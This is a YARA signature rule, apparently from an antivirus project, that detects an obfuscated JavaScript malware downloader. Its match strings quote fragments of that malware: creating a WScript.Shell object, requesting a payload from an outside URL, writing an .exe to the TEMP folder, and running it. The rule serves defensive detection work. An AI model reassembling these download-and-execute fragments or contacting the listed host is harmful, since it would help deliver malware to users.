rule sig_20160401_27519d4ebfb381e9ea5b61dfb22113e7 {
  meta:
    description = "datamaliciousorder - file 20160401_27519d4ebfb381e9ea5b61dfb22113e7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d3be96803ad3a6403f68bf6a014e457695336d4a890687b492ca646e373c1da4"

  strings:
    $s1  = "var JqgJou = function QgzZu() {return WScript[EvWa](\"WScript\"+\".Shell\");}(), GpPzj = 11;" fullword ascii
    $s2  = "function MfZzh(ZkJqa, SymGcl){FjOf = FjOf * 1; return ZkJqa - SymGcl;};" fullword ascii
    $s3  = "if (GlTrd[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "GlTrd[IlfYq](\"G\" + \"ET\", \"http://garmulewicz.pl/v4yhsa\", false);" fullword ascii
    $s5  = "function NwUh(){return GdwTkb + \"\";};" fullword ascii
    $s6  = "function FeRwq() {return JqgJou[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"LJ3TRvjUy4wy5a.ex\" + \"e\";};" fullword ascii
    $s7  = "function SdsMv() {return ((OxlJo == true) && (OxlJo == AbBz)) ? 1 : FjOf;};" fullword ascii
    $s8  = "function MqrMu()" fullword ascii
    $s9  = "AbBz = true; " fullword ascii
    $s10 = "var KgaCe = new this[\"Date\"]();" fullword ascii
    $s11 = "}while (YuYpm);" fullword ascii
    $s12 = "var HqlUf = false;" fullword ascii
    $s13 = "function SxNvx(NujTw){JqgJou[\"R\"+\"un\"](NujTw, FjOf, FjOf);};" fullword ascii
    $s14 = "function SiLc(){return 23;};" fullword ascii
    $s15 = "OxlJo = true; " fullword ascii
    $s16 = "function VyzCop(XrpWf) {var ZzaUa = (1, 2, 3, 4, 5, XrpWf); return ZzaUa;};" fullword ascii
    $s17 = "return MfZzh(VxxDh, UtyPvy);" fullword ascii
    $s18 = "function RdTqv(){return EvWa;};" fullword ascii
    $s19 = "var OxlJo = false;" fullword ascii
    $s20 = "var AbBz = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}